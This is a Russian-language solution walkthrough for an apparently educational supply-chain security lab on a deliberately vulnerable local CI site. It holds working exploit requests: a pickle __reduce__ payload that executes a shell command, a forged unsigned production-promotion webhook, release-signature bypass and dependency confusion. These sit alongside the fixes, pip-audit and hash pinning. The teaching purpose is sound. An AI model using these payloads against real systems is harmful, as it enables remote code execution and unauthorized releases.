🌐 [English](./SOLUTION.md) · **Русский** · [Oʻzbekcha](./SOLUTION.uz.md)

# A03 — Решение (спойлеры!)

Сначала попробуйте пройти лабу сами, используя подсказки из [README](./README.ru.md).

## Часть 1. Четыре дефекта сайта Kestrel CI

Все запросы ниже разобраны для vulnerable-версии (порт 8021). В исправленной версии (8022) они должны быть отклонены — что именно меняется, сказано в конце.

### Дефект 1. Хеш артефакта не пересчитывается, подпись не проверяется

```bash
curl -s -X POST http://127.0.0.1:8021/api/releases \
  -H 'Content-Type: application/json' \
  -d '{"name": "app", "version": "2.14.0",
       "digest": "0000000000000000000000000000000000000000000000000000000000000000",
       "artifact": "app-2.14.0"}'
```

Ответ:

```json
{"ok": true, "message": "Release published without a signature",
 "detail": "The digest was taken from the request as is ...",
 "flag": "FLAG{a03_unverified_release}"}
```

Сервер взял хеш из запроса, не посчитал SHA-256 от содержимого артефакта и не сравнил подпись ни с чем. Если добавить любое значение в поле `signature`, ответ станет `Release published, signature ignored` — сама подпись ни на что не влияет. То же самое видно в браузере: форма на `/builds` уже заполнена несовпадающим хешем, нажмите «Опубликовать релиз».

Почему это плохо: подпись и хеш — единственный способ связать артефакт с тем, что собрано из конкретного коммита. Если их принимают на слово, сборка (или тот, кто получил доступ к её токену) может положить в реестр что угодно под любым именем и любым хешем.

### Дефект 2. Профиль сборки разбирается через pickle

Готовим блоб и отправляем его:

```bash
python - <<'PY'
import base64, os, pickle

class Profile:
    def __reduce__(self):
        return (os.system, ("id",))

print(base64.b64encode(pickle.dumps(Profile())).decode())
PY
```

```bash
curl -s -X POST http://127.0.0.1:8021/api/builds/run \
  -H 'Content-Type: application/json' \
  -d '{"profile": "<полученный base64>"}'
```

Ответ: `{"message": "Build finished from a serialized profile", "flag": "FLAG{a03_insecure_deserialization}"}`. Вывод команды `id` печатается в том терминале, где запущена лаба: `pickle.loads` выполняет код **во время разбора**, ещё до того, как сервер прочитает первое поле профиля. Никакой ошибки при этом не возникает — для сервера это просто успешный разбор.

![Проверяйте этот запрос только на своей локальной лабе]

Профиль сборки — это данные, а не код. Достаточно было ограничиться JSON.

### Дефект 3. Вебхук CI принимается без подписи

```bash
curl -s -X POST http://127.0.0.1:8021/webhooks/ci \
  -H 'Content-Type: application/json' \
  -d '{"event": "release.approve", "build": "#4821", "env": "production"}'
```

Ответ: `{"message": "Build promoted to production", "flag": "FLAG{a03_unsigned_webhook}"}`. Заголовка `X-Kestrel-Signature` в запросе нет вообще, но сборка всё равно переведена в продакшен. Значит, релиз в прод может выпустить любой, кто знает адрес: например, отправив событие с номером сборки, которая прошла не все проверки.

### Дефект 4. Имена пакетов разрешаются по обоим индексам

```bash
curl -s -X POST http://127.0.0.1:8021/api/registry/install \
  -H 'Content-Type: application/json' -d '{"name": "kestrel-utils"}'
```

Ответ: `Package resolved from the public mirror`, флаг `FLAG{a03_dependency_confusion}`. Внутри `kestrel-utils` есть версия `1.4.2`, в публичном зеркале — та же версия `1.4.2` от неизвестного издателя и версия `9.9.9`. Резолвер смотрит в оба индекса, берёт самую новую версию и не сверяет хеш, поэтому сборка ставит чужой пакет.

Повторите с закреплённой версией:

```bash
curl -s -X POST http://127.0.0.1:8021/api/registry/install \
  -H 'Content-Type: application/json' \
  -d '{"name": "kestrel-utils", "version": "1.4.2"}'
```

Ответ снова про публичное зеркало: при одинаковой версии в двух индексах побеждает публичный. Отсюда вывод: **указать версию недостаточно**, нужен ещё и хеш из lock-файла. Для сравнения — пакет, которого в публичном зеркале нет:

```bash
curl -s -X POST http://127.0.0.1:8021/api/registry/install \
  -H 'Content-Type: application/json' \
  -d '{"name": "kestrel-report", "version": "0.9.7"}'
```

Здесь ответ нормальный: `Package installed from the internal index`.

### Что делает исправленная версия

| Дефект | vulnerable | fixed |
|--------|-----------|-------|
| 1. Релиз | принимает любой хеш и подпись | сам считает SHA-256 от `artifact`, сверяет с `digest` → `400 Digest mismatch`; затем проверяет HMAC-SHA256 от хеша ключом проекта → `400 Signature missing or invalid` |
| 2. Профиль | `pickle.loads` | только `json.loads`; блоб → `400 Profile not accepted` |
| 3. Вебхук | подпись не проверяется | считает HMAC-SHA256 от **тела запроса** и сравнивает с `X-Kestrel-Signature` через `hmac.compare_digest` → без подписи `403 Signature required` |
| 4. Пакеты | оба индекса, хеш не проверяется | только внутренний индекс, версия должна быть закреплена, хеш сверяется с lock-файлом |

Проверка релиза на исправленной версии (хеш и подпись считаются правильно):

```bash
python - <<'PY'
import hashlib, hmac, json, urllib.request

KEY = "kestrel-lab-project-key"
artifact = "app-2.14.0"
digest = hashlib.sha256(artifact.encode()).hexdigest()
signature = hmac.new(KEY.encode(), digest.encode(), "sha256").hexdigest()

payload = {"name": "app", "version": "2.14.0", "digest": digest,
           "signature": signature, "artifact": artifact}
request = urllib.request.Request(
    "http://127.0.0.1:8022/api/releases",
    data=json.dumps(payload).encode(),
    headers={"Content-Type": "application/json"})
print(urllib.request.urlopen(request).read().decode())
PY
```

Ответ: `{"ok": true, "message": "Release published"}`. Если поменять в скрипте `artifact` и не менять `digest` — `400 Digest mismatch`; если оставить хеш, но подписать другим ключом — `400 Signature missing or invalid`.

Проверка подписанного вебхука:

```bash
python - <<'PY'
import hashlib, hmac, json, urllib.request

KEY = "kestrel-lab-project-key"
body = json.dumps({"event": "release.approve", "build": "#4821"}).encode()
signature = hmac.new(KEY.encode(), body, "sha256").hexdigest()

request = urllib.request.Request(
    "http://127.0.0.1:8022/webhooks/ci", data=body,
    headers={"Content-Type": "application/json",
             "X-Kestrel-Signature": "sha256=" + signature})
print(urllib.request.urlopen(request).read().decode())
PY
```

Ответ: `{"message": "Signature verified"}`. Подпись считается от **точных байтов тела**: если отправить другое тело или другой ключ — `403`.

Проверка реестра на исправленной версии:

```bash
# без версии: закрепление обязательно
curl -s -X POST http://127.0.0.1:8022/api/registry/install \
  -H 'Content-Type: application/json' -d '{"name": "kestrel-utils"}'
# -> 400 Version not pinned

# закреплённая версия: только внутренний индекс и совпавший хеш
curl -s -X POST http://127.0.0.1:8022/api/registry/install \
  -H 'Content-Type: application/json' \
  -d '{"name": "kestrel-utils", "version": "1.4.2"}'
# -> 200 Package installed from the internal index

# хеш пакета в индексе не совпадает с lock-файлом (в лабе это acme-auth 1.8.1)
curl -s -X POST http://127.0.0.1:8022/api/registry/install \
  -H 'Content-Type: application/json' \
  -d '{"name": "acme-auth", "version": "1.8.1"}'
# -> 400 Hash mismatch

# имя есть только в публичном зеркале
curl -s -X POST http://127.0.0.1:8022/api/registry/install \
  -H 'Content-Type: application/json' -d '{"name": "requests"}'
# -> 404 Public index refused
```

Случай с `acme-auth` в лабе подготовлен специально: хеш пакета в индексе отличается от закреплённого в lock-файле, поэтому видно, что проверка действительно работает, а не просто «всё принимается».

**Список флагов:** `FLAG{a03_unverified_release}`, `FLAG{a03_insecure_deserialization}`, `FLAG{a03_unsigned_webhook}`, `FLAG{a03_dependency_confusion}`.

---

## Часть 2. Уязвимые зависимости

### Поиск уязвимых зависимостей

```bash
pip install pip-audit
pip-audit -r vulnerable/requirements.txt --no-deps --disable-pip
```

`--no-deps --disable-pip` нужны, потому что все версии в файле уже закреплены и ничего устанавливать для проверки не требуется.

На момент создания лабы (октябрь 2026) `pip-audit` находит уведомления в **семи** пакетах:

| Пакет | Версия | Как попал в проект |
|-------|--------|--------------------|
| Flask | 2.2.2 | напрямую |
| Werkzeug | 2.2.2 | зависимость Flask |
| Jinja2 | 3.1.2 | зависимость Flask |
| requests | 2.25.1 | напрямую |
| urllib3 | 1.26.4 | зависимость requests |
| idna | 2.10 | зависимость requests |
| certifi | 2024.8.30 | зависимость requests |

Большинство проблем находится в **транзитивных** зависимостях: в проекте их никто не выбирал, но они работают в продакшене. Точные числа и идентификаторы со временем меняются, потому что базы уязвимостей пополняются.

### Исправление (fixed)

1. Обновлены версии: Flask 3.1.3, Werkzeug 3.1.9, Jinja2 3.1.6, requests 2.33.0 (и их зависимости).
2. В `requirements.in` перечислены только прямые зависимости, а `requirements.txt` сгенерирован `pip-compile` вместе со всеми транзитивными пакетами и хешами:

   ```bash
   pip install pip-tools
   pip-compile --generate-hashes --strip-extras --output-file=requirements.txt requirements.in
   ```

3. Установка в Docker идёт с `--require-hashes`: pip откажется ставить пакет, если его содержимое не совпадает с хешем.

Проверка:

```bash
pip-audit -r fixed/requirements.txt --no-deps --disable-pip
# No known vulnerabilities found
```

### Эксперимент с хешем

```bash
sed 's/--hash=sha256:[0-9a-f]\{64\}/--hash=sha256:0000000000000000000000000000000000000000000000000000000000000000/g' \
  fixed/requirements.txt > tampered.txt
python -m venv /tmp/venv-test
/tmp/venv-test/bin/pip install --require-hashes -r tampered.txt
```

Результат: `ERROR: THESE PACKAGES DO NOT MATCH THE HASHES FROM THE REQUIREMENTS FILE ...`, установка не выполняется. Так pip защищает от подмены пакета на пути с индекса.

> Эксперимент нужно делать в **чистом** окружении: если пакеты уже установлены, pip их не скачивает и хеши не сверяет.

### SBOM

```bash
pip-audit -r fixed/requirements.txt --no-deps --disable-pip -f cyclonedx-json -o sbom.json
```

Получится перечень компонентов проекта в формате CycloneDX (JSON). Его можно хранить рядом с релизом и сверять с новыми уведомлениями.

## Что ещё стоит помнить

- Lock-файл с хешами защищает от подмены, но **не** от уязвимостей: версии всё равно нужно обновлять.
- Проверку зависимостей стоит запускать автоматически (например, в CI) и по расписанию.
- Дефект 4 из первой части — та самая подмена внутреннего пакета публичным (dependency confusion). Защита от неё: внутренний индекс как единственный источник плюс хеши из lock-файла.
